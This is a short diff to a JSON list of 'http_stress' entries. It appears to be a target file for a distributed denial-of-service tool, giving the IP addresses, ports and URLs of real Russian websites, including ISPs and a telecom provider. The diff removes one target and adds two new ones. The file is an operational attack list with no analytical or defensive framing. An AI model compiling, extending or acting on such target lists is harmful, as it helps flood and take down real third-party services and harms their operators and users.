@@ -3,5 +3,6 @@
   {"kind":"http_stress","method":"GET","ip":"87.236.19.158","port": 80, "url": "http://internet-belgorod.ru/"},
   {"kind":"http_stress","method":"GET","ip":"37.140.192.138","port": 443, "url": "https://inetspace.ru/"},
   {"kind":"http_stress","method":"GET","ip":"194.190.28.4","port": 443, "url": "https://belrts.ru/"},
-  {"kind":"http_stress","method":"GET","ip":"178.248.236.3","port": 443, "url": "https://rostov.edostav.ru/"}
+  {"kind":"http_stress","method":"GET","ip":"5.188.29.153","port": 443, "url": "https://rnd-beeline.ru"},
+  {"kind":"http_stress","method":"GET","ip":"212.109.218.234","port": 443, "url": "https://gorod-novoross.ru/"}
 ]
